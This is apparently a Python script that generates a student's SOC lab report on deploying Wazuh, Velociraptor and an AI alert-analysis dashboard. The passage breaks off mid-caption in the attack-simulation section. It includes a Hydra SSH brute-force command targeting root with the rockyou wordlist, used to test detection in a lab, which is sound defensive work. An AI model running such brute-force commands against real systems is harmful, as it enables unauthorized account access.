"""Generate SOC Lab Report as .docx with embedded screenshots."""
import os
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT

ASSETS = r"C:\Users\admin\.cursor\projects\c-Users-admin-Desktop\assets"
PREFIX = "c__Users_admin_AppData_Roaming_Cursor_User_workspaceStorage_d2451a5e03e42e098cdb9039605ebb7c_images_"

def img(uuid):
    return os.path.join(ASSETS, f"{PREFIX}image-{uuid}.png")

def diagram():
    return os.path.join(ASSETS, f"{PREFIX}Network_diagram-b0c19f92-cd8a-49a2-8b88-922a8c84619f.png")

def workflow(name, uuid):
    return os.path.join(ASSETS, f"{PREFIX}{name}-{uuid}.png")

# Screenshot mapping from user's messages
SCREENSHOTS = {
    "linode_dashboard": img("eb1e87ca-82a2-4ff2-8b8f-5e6c2a1dc139"),
    "docker_ps": img("b5a05778-eed6-485b-a0f2-33fef477059b"),
    "ubuntu_ip": img("65c8a177-5a78-48cd-a937-acd9754f9fcf"),
    "kali_ip": img("e74b9f58-0551-446e-bf3d-216c2954e874"),
    "wazuh_overview": img("47914be2-8536-4587-ba23-33026e250f8c"),
    "wazuh_agents": img("c70349d8-a0fa-4cff-9a3f-98e0fa176ad4"),
    "wazuh_deploy": img("24a9bb7e-8427-4a1f-9ebe-e8ff33404635"),
    "ubuntu_syscheck": img("60401cd4-33f7-4261-a431-de850e3c9952"),
    "active_response": img("95e56d3a-ef02-4be0-81c5-6c41aa30d863"),
    "network_diagram": diagram(),
    "velociraptor_welcome": img("61a86b38-2462-4961-a77b-75189dd6c170"),
    "velociraptor_clients": img("50764569-7e5d-4d75-9691-8fcbcf0bd4f3"),
    "velociraptor_collection": img("2b29257d-01be-43c7-a8e4-05d96045552a"),
    "threat_hunting_dashboard": img("4e2b1d84-9cdf-49d1-a4eb-027223b064ab"),
    "brute_force_alerts": img("895ec078-1115-4be9-96cf-ab488360e794"),
    "fim_events": img("576c674b-3543-4920-8fcc-cb73f9333654"),
    "soc_dashboard_main": img("22696282-848c-473e-9ee8-751c87342f5b"),
    "soc_dashboard_scroll": img("69dc35c8-3b4f-4272-b9a9-0e642e0f497d"),
    "hydra_attack": img("938ee5a3-91df-426c-8d41-02390b8f0d89"),
    "ubuntu_ssh_logs": img("474644a2-b822-4533-bb61-e00d0d615194"),
    "iptables_block": img("31275250-8c7c-41b5-9dc8-56859a02bae6"),
    "fim_test_commands": img("24db91a4-ea85-4ab8-8109-ddd0932becad"),
    "ubuntu_fim_commands": img("65c8a177-5a78-48cd-a937-acd9754f9fcf"),
    # Velociraptor screenshots (provided by user)
    "velo_client_overview": img("6243e92a-cfe3-4c26-b379-81058e4bf0f7"),
    "velo_lastlogin_select": img("606d436f-16ce-40af-bd5b-e1c1fc9bef37"),
    "velo_lastlogin_results": img("c9bc3bfc-ae96-4b29-8f16-48dfe13b7da8"),
    "velo_lastlogin_scrolled": img("f09b420b-ad34-47b8-8ed2-2a0d163b4502"),
    "velo_pslist_results": img("fada9e94-4239-4638-a99c-1e7930ca9f16"),
    "velo_pslist_scrolled": img("b045a37c-2c74-4300-9c02-5274a857cb60"),
    # Expanded alert / FIM detail views
    "alert_expanded_top": img("9a9915c1-142e-41e0-ba47-5219c05b6134"),
    "alert_expanded_mitre": img("cbe25551-b9fe-43f3-b49f-d77da60109aa"),
    "fim_expanded_top": img("cb5fb348-1eb3-4221-83a3-c09211b2f049"),
    "fim_expanded_mid": img("237e7f28-f201-4f0a-ac2a-9851ca353392"),
    "fim_expanded_bottom": img("4a1d79a5-e0ec-4886-a250-7517f980f578"),
    # SOC Dashboard with live data
    "soc_dashboard_live": img("1f77008f-9be9-4912-8d4e-083b16876839"),
    # AI analysis output sections
    "ai_exec_summary": img("d6eaf933-8698-4b9a-aa59-1d67e141d3cc"),
    "ai_attack_analysis": img("9454eebb-b5d9-4d5e-9308-440c3ddac51b"),
    "ai_file_integrity": img("d61ecffe-c855-4e81-9d75-1388e72efa06"),
    "ai_recommendations": img("2ed9c79a-8dfd-4766-b5e0-d772b8829f96"),
    # Follow-up question
    "ai_followup_top": img("01e7b729-7efa-4702-9db7-a980c4debdea"),
    "ai_followup_bottom": img("c5bd80ab-6661-48c7-818f-491448b36ff9"),
    # Workflow diagrams
    "workflow_active_response": workflow("4.6_workflow", "b84160b2-b4c7-4579-b63d-1bc95a32317d"),
    "workflow_soc_dashboard": workflow("7.2_workflow", "4bf5c4fe-64bd-42b6-96ef-f27afde4b8f4"),
    # Active Response verification screenshots
    "ar_iptables_drop": img("b36b20d0-69c9-41db-8548-2e52cfac12d9"),
    "ar_hydra_blocked": img("e21d753e-debf-4875-b3a4-ce1665d6a1c6"),
    # Malware simulation screenshots
    "malware_delivery": img("b3b59fbd-080e-44fb-83c7-1050a453e83e"),
    "malware_execution": img("c2695e81-c038-464b-8671-2da2284bf5ee"),
    # Post-malware Velociraptor file forensics
    "bashrc_backdoor_active": img("4455457c-12f4-48a5-a19e-51c06964c6b5"),
    "velo_bashhistory_results": img("ae9efc9e-a148-402b-9f61-a4addd5d49b5"),
    "velo_bashhistory_last": img("5297eba4-f461-4950-9a78-791cd500b346"),
    "velo_shell_bashrc": img("26945b3a-bb3b-4cba-ad51-788dbcfb3491"),
}

doc = Document()

# Page margins: 1.25in left/right, 1.0in top/bottom
section = doc.sections[0]
section.left_margin = Inches(1.25)
section.right_margin = Inches(1.25)
section.top_margin = Inches(1.0)
section.bottom_margin = Inches(1.0)

# Normal style: Times New Roman, 12pt, 6pt space after
style = doc.styles["Normal"]
style.font.name = "Times New Roman"
style.font.size = Pt(12)
style.paragraph_format.space_after = Pt(6)

# Heading styles
h1s = doc.styles["Heading 1"]
h1s.font.name = "Times New Roman"
h1s.font.size = Pt(14)
h1s.font.bold = True
h1s.font.color.rgb = RGBColor(0x1A, 0x36, 0x5D)
h1s.paragraph_format.space_before = Pt(24)
h1s.paragraph_format.space_after = Pt(0)

h2s = doc.styles["Heading 2"]
h2s.font.name = "Times New Roman"
h2s.font.size = Pt(13)
h2s.font.bold = True
h2s.font.color.rgb = RGBColor(0x1A, 0x36, 0x5D)
h2s.paragraph_format.space_before = Pt(10)
h2s.paragraph_format.space_after = Pt(0)

h3s = doc.styles["Heading 3"]
h3s.font.name = "Times New Roman"
h3s.font.bold = True
h3s.font.color.rgb = RGBColor(0x1A, 0x36, 0x5D)
h3s.paragraph_format.space_before = Pt(10)
h3s.paragraph_format.space_after = Pt(0)


def tnr(run, size=None, bold=None, italic=None):
    """Apply Times New Roman to a run with optional overrides."""
    run.font.name = "Times New Roman"
    if size is not None:
        run.font.size = Pt(size)
    if bold is not None:
        run.font.bold = bold
    if italic is not None:
        run.font.italic = italic


def add_figure(key, caption, width=5.8):
    path = SCREENSHOTS.get(key, "")
    if os.path.exists(path):
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run()
        run.add_picture(path, width=Inches(width))
        cap = doc.add_paragraph(caption)
        cap.alignment = WD_ALIGN_PARAGRAPH.CENTER
        cap.style = doc.styles["Normal"]
        for run in cap.runs:
            tnr(run, size=9, italic=True)
    else:
        p = doc.add_paragraph(f"[SCREENSHOT MISSING: {key}] — {caption}")
        p.runs[0].font.color.rgb = RGBColor(0xCC, 0x00, 0x00)


def add_code_block(text):
    p = doc.add_paragraph()
    run = p.add_run(text)
    tnr(run, size=9)
    p.paragraph_format.left_indent = Inches(0.3)


def add_table(headers, rows):
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = h
        for par in cell.paragraphs:
            for run in par.runs:
                tnr(run, size=10)
    for r, row in enumerate(rows):
        for c, val in enumerate(row):
            cell = table.rows[r + 1].cells[c]
            cell.text = str(val)
            for par in cell.paragraphs:
                for run in par.runs:
                    tnr(run, size=10)


# ========== TITLE PAGE ==========
for _ in range(6):
    doc.add_paragraph()

title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = title.add_run(
    "SOC Threat Detection and Investigation using Wazuh,\n"
    "Velociraptor, and AI-assisted Alert Analysis"
)
tnr(run, size=26, bold=True)

doc.add_paragraph()
doc.add_paragraph()

for label, value in [
    ("Student Name: ", "Nguyễn Ngọc Quang"),
    ("Student ID: ", "23BI14376"),
    ("External Instructor: ", "Trần Trương Ngọc Nam"),
    ("Internal Instructor: ", "Nguyễn Minh Hương"),
]:
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r1 = p.add_run(label)
    tnr(r1, size=12, bold=True)
    r2 = p.add_run(value)
    tnr(r2, size=12)

doc.add_page_break()

# ========== SECTION 1: INTRODUCTION ==========
doc.add_heading("1. Introduction", level=1)

doc.add_paragraph(
    "A Security Operations Center (SOC) is the centralized unit within an organization responsible for "
    "monitoring, detecting, analyzing, and responding to cybersecurity threats in real-time. SOC teams rely "
    "on a combination of technology, processes, and skilled personnel to protect organizational assets from "
    "cyberattacks, data breaches, and other security incidents."
)

doc.add_paragraph(
    "In today's increasingly digital landscape, organizations face a growing number of sophisticated cyber "
    "threats, ranging from brute-force attacks and malware infections to unauthorized access and data "
    "exfiltration. The need for effective, real-time security monitoring has never been more critical. However, "
    "many organizations — especially small and mid-sized businesses — lack the resources to build and maintain "
    "a fully staffed SOC. This is where automated tools and AI-assisted analysis become invaluable."
)

doc.add_paragraph(
    "This project aims to build a functional SOC lab environment using open-source and freely available tools "
    "to simulate a real-world security operations workflow. The lab integrates three core components:"
)

for tool, desc in [
    ("Wazuh", "An open-source Security Information and Event Management (SIEM) platform that provides log analysis, intrusion detection, file integrity monitoring, vulnerability detection, and active response capabilities."),
    ("Velociraptor", "A powerful open-source digital forensics and incident response (DFIR) tool that enables endpoint visibility, artifact collection, and threat hunting across connected systems."),
    ("AI-Assisted Alert Analysis", "A custom-built web dashboard powered by a large language model (Llama 3.3 70B via Groq) that automatically analyzes Wazuh security alerts and provides human-readable summaries, MITRE ATT&CK mappings, and actionable recommendations."),
]:
    p = doc.add_paragraph()
    run = p.add_run(f"{tool} — ")
    tnr(run, bold=True)
    tnr(p.add_run(desc))

doc.add_paragraph(
    "By combining these tools, this project demonstrates a complete security monitoring pipeline: from attack "
    "detection to forensic investigation to AI-powered analysis — all within a controlled lab environment."
)

# ========== SECTION 2: PROJECT OBJECTIVES ==========
doc.add_heading("2. Project Objectives", level=1)

doc.add_paragraph("The primary objectives of this project are:")

objectives = [
    "Deploy a SIEM solution (Wazuh) on a cloud server to centrally collect and analyze security logs from multiple endpoints.",
    "Configure File Integrity Monitoring (FIM) to detect unauthorized file changes on monitored systems, such as file creation, modification, and deletion.",
    "Implement Active Response to automatically block malicious IP addresses when brute-force attacks are detected, demonstrating automated incident response capabilities.",
    "Deploy a forensics tool (Velociraptor) to enable endpoint investigation, artifact collection, and threat hunting on compromised systems.",
    "Simulate real-world cyberattacks using penetration testing tools (Hydra) to generate authentic security alerts and validate the detection capabilities of the lab.",
    "Build an AI-powered alert analysis dashboard that pulls live security alerts from Wazuh and uses a large language model to provide automated threat assessment, MITRE ATT&CK technique mapping, and SOC analyst-style recommendations.",
    "Document the entire process from infrastructure setup to attack simulation to AI analysis, demonstrating a complete SOC workflow.",
]
for i, obj in enumerate(objectives, 1):
    p = doc.add_paragraph(f"{i}. {obj}")

doc.add_page_break()

# ========== SECTION 3: LAB ARCHITECTURE & SETUP ==========
doc.add_heading("3. Lab Architecture & Setup", level=1)

doc.add_heading("3.1 Architecture Overview", level=2)

doc.add_paragraph(
    "The lab consists of four main components distributed across cloud and local virtual environments:"
)

add_table(
    ["Component", "Platform", "IP Address", "Role"],
    [
        ["Wazuh Server (Docker)", "Linode VPS (Cloud)", "139.162.62.154", "SIEM — log collection, alerts, active response"],
        ["Velociraptor Server", "Linode VPS (Cloud)", "139.162.62.154", "Forensics — endpoint investigation"],
        ["Ubuntu 24.04 VM", "VMware (Local)", "192.168.110.130", "Agent/Victim — monitored endpoint"],
        ["Kali Linux VM", "VMware (Local)", "192.168.110.129", "Attacker — brute-force with Hydra"],
        ["Windows 11 VM", "VMware (Local)", "192.168.110.131", "Registered Wazuh agent (disconnected)"],
        ["SOC Dashboard", "Host Machine (Windows)", "localhost:5000", "AI analysis — Flask + Groq/Llama 3.3"],
    ],
)

doc.add_paragraph()

doc.add_heading("3.2 Network Diagram", level=2)
doc.add_paragraph(
    "The following diagram illustrates the complete lab architecture, showing all components, their connections, "
    "data flows, and the attack path:"
)

add_figure("network_diagram",
    "Figure 3.1: SOC Lab Network Architecture showing Linode VPS with Wazuh and Velociraptor servers, "
    "local VMs (Ubuntu victim, Kali attacker, Windows 11 agent), and the AI-powered SOC Dashboard. "
    "The red arrow indicates the SSH brute-force attack path from Kali (192.168.110.129) to Ubuntu (192.168.110.130).")

doc.add_heading("3.3 Linode Cloud Server", level=2)
doc.add_paragraph(
    "The Wazuh server and Velociraptor server are hosted on a Linode VPS (Linode 2 GB plan) located in the "
    "SG (Singapore) region. The server runs Docker containers for the Wazuh stack."
)

add_figure("linode_dashboard",
    "Figure 3.2: Linode Cloud Manager showing the wazuh_docker server instance running with public IP "
    "139.162.62.154 in the Singapore region.")

doc.add_heading("3.4 Docker Containers", level=2)
doc.add_paragraph(
    "The Wazuh stack runs as three Docker containers on the Linode server:"
)
for name, desc in [
    ("single-node_wazuh.manager_1", "Wazuh Manager (ports 1514, 1515, 55000)"),
    ("single-node_wazuh.dashboard_1", "Wazuh Dashboard (port 443)"),
    ("single-node_wazuh.indexer_1", "Wazuh Indexer/OpenSearch (port 9200)"),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{name}"), bold=True)
    tnr(p.add_run(f" — {desc}"))

add_figure("docker_ps",
    "Figure 3.3: Docker containers running on the Linode server. The Wazuh Manager handles agent "
    "communication and alert processing, the Indexer stores alert data, and the Dashboard provides "
    "the web-based management interface.")

doc.add_heading("3.5 Virtual Machines", level=2)
doc.add_paragraph(
    "All local virtual machines are managed using VMware Workstation. The Ubuntu VM serves as the primary "
    "monitored endpoint (victim), the Kali VM acts as the attacker, and the Windows 11 VM is a registered "
    "but disconnected agent."
)

p = doc.add_paragraph()
tnr(p.add_run("Ubuntu 24.04 VM (Victim/Agent):"), bold=True)

add_figure("ubuntu_ip",
    "Figure 3.4: Ubuntu 24.04 VM network configuration showing IP address 192.168.110.130 on the ens33 "
    "interface. This machine runs both the Wazuh agent and Velociraptor client.")

p = doc.add_paragraph()
tnr(p.add_run("Kali Linux VM (Attacker):"), bold=True)

add_figure("kali_ip",
    "Figure 3.5: Kali Linux VM network configuration showing IP address 192.168.110.129 on the eth0 "
    "interface. Both VMs are on the same 192.168.110.0/24 subnet, enabling direct network communication "
    "for attack simulation.")

doc.add_page_break()

# ========== SECTION 4: WAZUH SERVER SETUP ==========
doc.add_heading("4. Wazuh Server Setup", level=1)

doc.add_heading("4.1 Overview", level=2)
doc.add_paragraph(
    "Wazuh is an open-source security platform that provides unified XDR (Extended Detection and Response) "
    "and SIEM capabilities. It was deployed on the Linode VPS using the official wazuh-docker repository, "
    "which simplifies deployment through Docker Compose."
)

doc.add_paragraph("The Wazuh deployment consists of three core components:")
for name, desc in [
    ("Wazuh Manager", "Receives and analyzes data from agents, triggers alerts based on rulesets, and executes active responses."),
    ("Wazuh Indexer", "Based on OpenSearch, it stores and indexes all alerts and events for searching and analysis."),
    ("Wazuh Dashboard", "A web-based interface for visualizing alerts, managing agents, and configuring the platform."),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{name} — "), bold=True)
    tnr(p.add_run(desc))

doc.add_heading("4.2 Installation Process", level=2)
doc.add_paragraph("The Wazuh stack was deployed using Docker Compose from the official repository:")
add_code_block(
    "# Clone the Wazuh Docker repository\n"
    "git clone https://github.com/wazuh/wazuh-docker.git -b v4.14.4\n\n"
    "# Navigate to the single-node deployment\n"
    "cd wazuh-docker/single-node\n\n"
    "# Generate SSL certificates\n"
    "docker-compose -f generate-indexer-certs.yml run --rm generator\n\n"
    "# Start the Wazuh stack\n"
    "docker-compose up -d"
)

doc.add_heading("4.3 Wazuh Dashboard", level=2)
doc.add_paragraph(
    "After deployment, the Wazuh Dashboard is accessible at https://139.162.62.154. The dashboard provides a "
    "comprehensive overview of the security posture, including agent status, alert severity levels, and quick "
    "access to all security modules."
)

add_figure("wazuh_overview",
    "Figure 4.1: Wazuh Dashboard Overview page showing the Agents Summary with active and disconnected agents, "
    "and the Last 24 Hours Alerts breakdown by severity level. The 37 medium severity alerts include brute-force "
    "detection events from the attack simulation.")

doc.add_heading("4.4 Agent Deployment", level=2)
doc.add_paragraph(
    "Wazuh agents were deployed on the Ubuntu and Windows 11 virtual machines to enable centralized log "
    "collection and monitoring. Agents communicate with the Wazuh Manager over port 1514 (event data) and "
    "1515 (agent registration)."
)

doc.add_paragraph("The agent deployment process is streamlined through the Wazuh Dashboard:")
for step in [
    "Navigate to Endpoints → Deploy new agent",
    "Select the operating system and architecture",
    "Enter the Wazuh Manager IP address (139.162.62.154)",
    "Copy and run the generated installation commands on the target machine",
]:
    doc.add_paragraph(step, style="List Bullet")

add_figure("wazuh_deploy",
    "Figure 4.2: Wazuh agent deployment page showing the auto-generated installation commands. The process "
    "involves downloading the agent package, configuring it with the manager's IP address, and starting the agent service.")

doc.add_paragraph(
    "After deployment, agents appear in the Endpoints list with their status, IP address, operating system, "
    "and version information:"
)

add_figure("wazuh_agents",
    "Figure 4.3: Wazuh Endpoints page showing two registered agents. Agent 001 (Ubuntu_24.04.4_LTS) is "
    "active and reporting to the manager at 192.168.110.130, while Agent 002 (Windows_11) at 192.168.110.131 "
    "is disconnected due to the VM being powered off to conserve system resources. Both run Wazuh v4.14.4.")

doc.add_heading("4.5 File Integrity Monitoring (FIM) Configuration", level=2)
doc.add_paragraph(
    "File Integrity Monitoring (FIM) was configured on the Ubuntu agent to detect unauthorized file changes "
    "in the /home directory. FIM works by creating a baseline of file checksums and then alerting when files "
    "are created, modified, or deleted."
)

doc.add_paragraph(
    "The /home directory was specifically chosen for FIM monitoring because it is one of the most "
    "security-critical locations on a Linux system. This directory contains:"
)

for item in [
    "User profile and configuration files (e.g., .bashrc, .profile) — an attacker could modify these "
    "to establish persistence by injecting malicious commands that execute on every login.",
    "SSH keys (~/.ssh/authorized_keys) — a compromised system could have unauthorized SSH keys added, "
    "granting the attacker persistent backdoor access even after passwords are changed.",
    "Personal documents and sensitive data — any data exfiltration or tampering by an attacker would "
    "involve files stored under /home.",
    "Application configuration files (~/.config/) — malware or attackers may alter application settings "
    "to disable security features or redirect data.",
]:
    doc.add_paragraph(item, style="List Bullet")

doc.add_paragraph(
    "In the context of this lab's brute-force attack scenario, monitoring /home is especially relevant: "
    "if the attacker successfully guesses the password and gains SSH access, FIM would immediately detect "
    "any post-compromise file modifications — such as dropping malware, adding SSH keys for persistence, "
    "or altering user configurations. This provides a critical second layer of detection beyond the initial "
    "brute-force alert."
)

add_figure("ubuntu_syscheck",
    "Figure 4.4: Wazuh agent syscheck (FIM) configuration on the Ubuntu VM. The scan frequency was set to "
    "60 seconds (reduced from the default 12 hours) for testing purposes, and scan_on_start is enabled to "
    "perform an immediate baseline scan when the agent starts.")

doc.add_paragraph("Key FIM configuration parameters:")
for param, desc in [
    ("<disabled>no</disabled>", "FIM is enabled"),
    ("<frequency>60</frequency>", "Scan every 60 seconds (default: 43200 / 12 hours)"),
    ("<scan_on_start>yes</scan_on_start>", "Perform a baseline scan immediately on agent start"),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{param}"), size=9, bold=True)
    tnr(p.add_run(f" — {desc}"))

doc.add_heading("4.6 Active Response Configuration", level=2)
doc.add_paragraph(
    "Active Response was configured on the Wazuh Manager to automatically block attacker IP addresses when "
    "brute-force attacks are detected. When Wazuh rule 5763 (SSH brute-force) triggers, the firewall-drop "
    "command is executed on the agent to add an iptables DROP rule for the attacker's IP, effectively blocking "
    "all further communication for 600 seconds (10 minutes)."
)

add_figure("active_response",
    "Figure 4.5: Wazuh Manager Active Response configuration showing the firewall-drop command configured to "
    "trigger on rule 5763 (SSH brute-force attack) with a 600-second timeout. This demonstrates automated "
    "incident response — the system defends itself without human intervention.")

doc.add_paragraph("The Active Response workflow:")
for i, step in enumerate([
    "Attacker launches SSH brute-force attack against the Ubuntu agent",
    "Wazuh agent forwards authentication failure logs to the Wazuh Manager",
    "Wazuh Manager correlates events and triggers rule 5763 (brute-force detected)",
    "Active Response executes firewall-drop on the Ubuntu agent",
    "The attacker's IP is added to the iptables DROP chain, blocking all traffic",
    "After 600 seconds, the IP is automatically unblocked",
], 1):
    doc.add_paragraph(f"{i}. {step}")

add_figure("workflow_active_response",
    "Figure 4.6: Active Response Workflow — sequence diagram showing the complete attack detection and "
    "automated response flow. The Kali attacker (192.168.110.129) launches a brute-force attack, the "
    "Ubuntu agent forwards logs to the Wazuh Manager, rule 5763 triggers, firewall-drop blocks the "
    "attacker via iptables, and the block is automatically removed after 600 seconds.")

doc.add_page_break()

# ========== SECTION 5: VELOCIRAPTOR SETUP (GUIDE MODE) ==========
doc.add_heading("5. Velociraptor Setup", level=1)

doc.add_heading("5.1 Overview", level=2)
doc.add_paragraph(
    "Velociraptor is an open-source digital forensics and incident response (DFIR) tool designed for endpoint "
    "visibility and threat hunting. Unlike Wazuh, which provides real-time alerting and passive monitoring, "
    "Velociraptor is used for active investigation — allowing SOC analysts to remotely query endpoints, collect "
    "forensic artifacts, and hunt for indicators of compromise (IOCs) after a security incident has been detected."
)

doc.add_paragraph(
    "In this lab, Velociraptor serves as the investigation layer: when Wazuh alerts the SOC team to a potential "
    "threat (e.g., brute-force attack), the analyst uses Velociraptor to dig deeper into the affected endpoint — "
    "checking login history, running processes, network connections, file system changes, and more."
)

doc.add_heading("5.2 Server Installation", level=2)
doc.add_paragraph("The Velociraptor server binary was downloaded and configured on the Linode VPS:")
add_code_block(
    "# Download the Velociraptor binary\n"
    "wget https://github.com/Velocidex/velociraptor/releases/download/v0.72/"
    "velociraptor-v0.72.0-linux-amd64 -O velociraptor\n"
    "chmod +x velociraptor\n\n"
    "# Run the interactive configuration wizard\n"
    "./velociraptor config generate -i"
)

doc.add_paragraph("During the configuration wizard, the following settings were specified:")
for setting in [
    "OS: Linux",
    "Datastore directory: /opt/velociraptor",
    "SSL: Self-Signed",
    "Public IP: 139.162.62.154",
    "Frontend port: 8000 (client communication)",
    "GUI port: 8889 (web interface)",
    "Admin username: admin",
]:
    doc.add_paragraph(setting, style="List Bullet")

doc.add_paragraph(
    "Important Note: By default, the Velociraptor GUI binds to 127.0.0.1 (localhost only). To make it "
    "accessible remotely, the bind_address in the GUI section of server.config.yaml was changed to 0.0.0.0."
)
add_code_block("GUI:\n  bind_address: 0.0.0.0\n  bind_port: 8889")

doc.add_paragraph("The server was then started in the background:")
add_code_block("nohup ./velociraptor --config server.config.yaml frontend -v > velo.log 2>&1 &")

doc.add_heading("5.3 Accessing the Velociraptor GUI", level=2)
doc.add_paragraph(
    "After starting the server, the Velociraptor web interface is accessible at https://139.162.62.154:8889."
)

add_figure("velociraptor_welcome",
    "Figure 5.1: Velociraptor GUI Welcome page after successful login. The interface provides quick access "
    "to common tasks including inspecting server state, building offline collectors, and writing VQL notebooks.")

doc.add_heading("5.4 Client Deployment on Ubuntu VM", level=2)
doc.add_paragraph("To connect the Ubuntu VM to the Velociraptor server, the client configuration file was transferred:")
add_code_block(
    "# Copy client config from Linode\n"
    "scp root@139.162.62.154:~/client.config.yaml ~/client.config.yaml\n\n"
    "# Download Velociraptor binary on Ubuntu\n"
    "wget https://github.com/Velocidex/velociraptor/releases/download/v0.72/"
    "velociraptor-v0.72.0-linux-amd64 -O velociraptor\n"
    "chmod +x velociraptor\n\n"
    "# Start the client in background\n"
    "nohup sudo ./velociraptor --config client.config.yaml client -v > velo-client.log 2>&1 &"
)

doc.add_heading("5.5 Viewing the Client Details", level=2)
doc.add_paragraph(
    "Once the client connects, it appears in the Velociraptor GUI. Clicking on the client's hostname "
    "reveals detailed system information including the Client ID, agent version, operating system, "
    "hostname, and connection timestamps."
)

add_figure("velociraptor_clients",
    "Figure 5.2: Velociraptor client search results showing the connected Ubuntu client (hostname: sudo) "
    "with Client ID C.9a25f3d3816b8d18 running Ubuntu 24.04.")

add_figure("velo_client_overview",
    "Figure 5.3: Velociraptor client overview page for the Ubuntu VM. Key details include Client ID "
    "(C.9a25f3d3816b8d18), Agent Version 0.72.0, Operating System Linux, Hostname 'sudo', "
    "and Release ubuntu24.04. The Last Seen IP shows the client's network address.")

doc.add_heading("5.6 Collecting Artifacts — Login History", level=2)
doc.add_paragraph(
    "Velociraptor's primary strength is its ability to remotely collect forensic artifacts from endpoints. "
    "The first artifact collected was Linux.Sys.LastUserLogin, which retrieves login history from the "
    "system's wtmp files. This is particularly useful for investigating the SSH brute-force attack "
    "detected by Wazuh — while Wazuh alerts on the attack, Velociraptor provides the forensic details."
)

doc.add_paragraph(
    "To collect this artifact, the New Collection dialog was opened from the client page, and "
    "Linux.Sys.LastUserLogin was selected. The artifact parses /var/log/wtmp files to extract "
    "login session records including user names, login types, PIDs, and IP addresses."
)

add_figure("velo_lastlogin_select",
    "Figure 5.4: Velociraptor New Collection dialog showing the Linux.Sys.LastUserLogin artifact "
    "selected. The artifact description indicates it finds and parses system wtmp files to determine "
    "when users last logged in. The wtmpGlobs parameter defaults to /var/log/wtmp*.")

doc.add_paragraph(
    "After launching the collection, the results showed 39 login records from the Ubuntu endpoint. "
    "The data includes login type (USER_PROCESS), process IDs, login hosts (login screen, tty2), "
    "usernames, and IP addresses:"
)

add_figure("velo_lastlogin_results",
    "Figure 5.5: Linux.Sys.LastUserLogin collection results showing login history from /var/log/wtmp. "
    "The Results tab displays columns for OSPath, login_Type, login_ID, login_PID, login_Host, "
    "login_User (sudo1), and login_IpAddr. The collection (FlowId: F.D7FLAHIVK7BMS) completed "
    "successfully with 39 rows of data.")

add_figure("velo_lastlogin_scrolled",
    "Figure 5.6: Linux.Sys.LastUserLogin results scrolled to show additional login entries. "
    "Multiple USER_PROCESS sessions are visible with varying PIDs (1901, 1947, 2281) and login hosts "
    "(login screen, tty2), all for user sudo1. The pagination shows 1 to 10 of 39 total records.")

doc.add_heading("5.7 Collecting Artifacts — Running Processes", level=2)

doc.add_paragraph(
    "The second artifact collected was Linux.Sys.Pslist, which enumerates all running processes on the "
    "endpoint. This helps SOC analysts identify any suspicious or unauthorized processes that may have "
    "been spawned as a result of the brute-force attack, such as reverse shells or persistence mechanisms."
)

doc.add_paragraph(
    "The collection returned 369 processes, including detailed information for each: PID, parent PID, "
    "process name, command line, executable path, file hashes (MD5, SHA1, SHA256), username, creation "
    "time, and memory usage."
)

add_figure("velo_pslist_results",
    "Figure 5.7: Linux.Sys.Pslist collection results showing running processes on the Ubuntu endpoint. "
    "The first entry is PID 1 (systemd) running as root with command '/sbin/init splash'. "
    "Notably, Velociraptor calculates file hashes (MD5, SHA1, SHA256) for each executable, enabling "
    "IOC lookups against threat intelligence databases. The collection (FlowId: F.D7FLGSS1VUDB2) "
    "completed with 369 rows.")

add_figure("velo_pslist_scrolled",
    "Figure 5.8: Linux.Sys.Pslist results scrolled to show the full SHA1 and SHA256 hash values for "
    "the systemd process. These hashes can be cross-referenced with VirusTotal or other threat "
    "intelligence platforms to verify process legitimacy. Pagination shows 1 to 10 of 369 total processes.")

doc.add_paragraph(
    "Together, the LastUserLogin and Pslist artifacts demonstrate Velociraptor's forensic investigation "
    "capability. After Wazuh detects a brute-force attack, the SOC analyst can use Velociraptor to "
    "determine if the attacker successfully logged in, what processes are running on the compromised "
    "system, and whether any malicious activity occurred post-compromise."
)

doc.add_paragraph()
doc.add_paragraph(
    "Additional useful artifacts for forensic investigation:"
)
add_table(
    ["Artifact Name", "What It Collects", "Why It's Useful"],
    [
        ["Linux.Sys.LastUserLogin", "Login history (wtmp)", "Shows brute-force evidence, login sessions"],
        ["Linux.Sys.Pslist", "Running processes + hashes", "Identifies suspicious processes, enables IOC lookups"],
        ["Linux.Network.Netstat", "Network connections", "Shows active attacker connections"],
        ["Linux.Sys.Crontab", "Scheduled tasks", "Checks for persistence mechanisms"],
    ],
)

doc.add_page_break()

# ========== SECTION 6: ATTACK SIMULATION ==========
doc.add_heading("6. Attack Simulation", level=1)

doc.add_paragraph(
    "To validate the detection capabilities of the SOC lab, two types of attacks were simulated against the "
    "Ubuntu VM (192.168.110.130): an SSH brute-force attack using Hydra launched from the Kali VM "
    "(192.168.110.129), and file integrity tests to trigger FIM alerts. These attacks generate authentic "
    "security events that flow through the entire monitoring pipeline — from agent to manager to dashboard."
)

doc.add_heading("6.1 SSH Brute-Force Attack with Hydra", level=2)

doc.add_paragraph(
    "Hydra is a fast and flexible online password-cracking tool commonly used in penetration testing. It was "
    "used to launch a dictionary-based SSH brute-force attack from the Kali VM against the Ubuntu VM."
)

doc.add_paragraph("The attack command used:")
add_code_block(
    "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.110.130"
)

doc.add_paragraph("Parameters breakdown:")
for param, desc in [
    ("-l root", "Target the root account for maximum impact"),
    ("-P /usr/share/wordlists/rockyou.txt", "Password wordlist (14 million+ entries)"),
    ("ssh://192.168.110.130", "Target protocol and IP address"),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{param}"), size=9, bold=True)
    tnr(p.add_run(f" — {desc}"))

add_figure("hydra_attack",
    "Figure 6.1: Hydra SSH brute-force attack launched from Kali Linux (192.168.110.129) targeting the "
